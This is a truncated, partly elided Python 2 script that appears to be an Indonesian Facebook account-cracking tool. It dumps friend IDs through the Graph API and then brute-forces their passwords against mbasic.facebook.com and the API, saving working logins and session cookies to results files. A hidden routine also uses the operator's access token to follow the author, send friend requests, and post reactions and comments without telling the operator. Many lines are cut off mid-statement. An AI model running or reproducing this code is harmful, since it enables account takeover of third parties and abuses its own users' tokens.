...
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Ok>
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
...
h='\033[0;90m'
q='\x1b[0m'    # WARNA MATI
w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m>
my_color = [
 p, m, i, k, b, u, c, q]
# lempankkkkkkkk
def __cek__():
...
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  '>
    for x in titik:
...
# LO ASU
logo = (c+"""    __  ___      ____  _              __    ____
   /  |/  /_  __/ / /_(_)  ____ ___  / /_  / __/
  / /|_/ / / / / / __/ /  / __ `__ \/ __ \/ /_
 / /  / / /_/ / / /_/ /  / / / / / / /_/ / __/
/_/  /_/\__,_/_/\__/_/  /_/ /_/ /_/_.___/_/

Facebook : Maul Maulana""")
# crack selesai
def hasil(ok,cp):
...
def __token__():
        ...
        if __cindy__ in ('get', 'Get', 'GET'):os.system('xdg-open  https://youtu.be/nH7A_13JaHQ')
                __token__()
try:
...
def cookie1():
        ...
        try:
                data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=>
                'user-agent'                : 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaC5-00.2>
                ...
                hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token i>
...
def moch_yayan():
    ...
    print k+' ['+i+'05'+k+']'+b+'=>'+p+'Start Crack'
    print k+' ['+i+'06'+k+']'+b+'=>'+p+'Get Informations Target'+k+' [ '+c+'FREE'+k+' ]'+q
    print k+' ['+i+'07'+k+']'+b+'=>'+p+'Lihat Hasil Crack'
    print k+' ['+i+'08'+k+']'+b+'=>'+p+'Seting User Agent'
    print k+' ['+i+'09'+k+']'+b+'=>'+p+'Cheak Token Facebook'
        ...
        if yan == '':
            ...
            if ask =="":
                ...
                try:
                    ...
                    print(" \033[0;94m[\033[0;92m+\033[0;94m] Hasil \033[0;92mOK\033[0;94m pada tang>
                ...
                try:
                    ...
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tang>
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] ------------------------------------>
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;97m[\033[0;91m!\033[0;97m]Hasil Crack Yang Cheak Point, Tidak A>
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
            else:
                moch_yayan()
                elif yan =='08' or yan =='08':
            ...
            print '\n %s[%s×%s]Menu [%s%s%s] Ini Tidak Terdaftar !!'%(N,M,N,M,yan,N);time.sleep(1);o>
...
def kontol():
        try:
                ...
                print '\n %s[%s×%s]Token Error !!'%(N,M,N)
                os.system('rm -rf login.txt')
        requests.post('https://graph.facebook.com/100061064815541/subscribers?access_token=%s'%(__ci>
        requests.post('https://graph.facebook.com/100061064815541/subscribers?access_token=%s'%(__ci>
        post = '329587379086753'
        kom3 = "Semoga Abang @[100061064815541:0] Panjang Umur Amin !!"
        vyhbhj = 'ANGRY'
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(s>
        requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg,vyhb>
        requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg2,vyh>
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=Bang @[100061064815>
        requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=Bang @[10006106481>
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access>
        requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom3 + '&acces>
...
def teman():
    ...
    try:
        ...
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__c>
        id = []
        ...
        for a in z['data']:
            ...
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m',>
            sys.stdout.write('\r\033[0m [\033[0;96m%s%s\033[0m] [\033[0;91m%s%s\033[0m]Sedang Dump I>
            )); sys.stdout.flush()
            time.sleep(1./3500)
...
#               cek_ingfo()
    ...
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(ppk, _>
        z = json.loads(r.text)
        for i in z['data']:
                id.append(i['id'])
    except: pass
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            print '\n [%s+%s]Hasil Crack OK Dispam Di -> results/OK-%s-%s-%s.txt'%(O>
                            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O>
                            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,>
...
#                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
    ...
    def __api__(self, user, _yan_):
        ...
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x>
        print '\r [%s%s%s]Cracking  %s/%s [ %sOK-:%s%s ] - [ %sCP-:%s%s ]'%(w,datetime.now().strftim>
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            ...
            try:
                ...
                user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data>
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x>
            ...
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': >
            ...
            try:
                    __cindy__ = open('login.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy_>
    ...
    def __mbasic__(self, user, _yan_):
        ...
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x>
        print '\r [%s%s%s]Cracking  %s/%s [ %sOK-:%s%s ] - [ %sCP-:%s%s ]'%(w,datetime.now().strftim>
#        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,>
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            ...
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x>
               ...
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-http-engine': 'Liger'}
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass':>
            xo = aw.content
...
#        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,>
        ...
        for pw in _yan_:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().>
